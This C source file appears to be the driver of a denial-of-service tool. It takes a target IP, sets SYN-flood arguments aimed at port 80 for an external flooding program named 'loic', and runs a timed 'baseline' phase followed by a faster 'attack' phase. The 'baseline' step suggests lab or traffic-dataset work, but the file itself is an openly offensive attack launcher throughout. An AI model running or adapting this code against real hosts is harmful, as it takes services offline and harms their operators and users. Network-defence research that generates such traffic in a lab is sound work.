#include "attack_process.h"
#include "io.h"

void set_base_valor(char** arg_list, char* loic_path, char* ip){
    arg_list[0] = loic_path;
    arg_list[1] = ip;
    arg_list[2] = "--syn";
    arg_list[3] = "-p";
    arg_list[4] = "80";
    arg_list[5] = NULL;
    arg_list[6] = NULL;
}

void set_baseline(
        char** arg_list,
        const char* loic_path,
        const unsigned int time_to_live
        ){

    print_set_baseline();
    call_attack(loic_path, arg_list, time_to_live);
}

void attack(char** arg_list,
        const char* loic_path,
        const unsigned int time_to_live
        ){

    print_attack();
    arg_list[5] = "--fast";
    call_attack(loic_path, arg_list, time_to_live);
}

int main(int argc, char *argv[]){
    char* loic_path = get_loic_path();
    printf("%s\n", loic_path);
    char** arg_list = alloc_arg_list();
    char* ip = get_ip(argc, argv);

    set_base_valor(arg_list, loic_path, ip);

    set_baseline(arg_list, loic_path, 450);
    attack(arg_list, loic_path, 320);

    return 0;
}
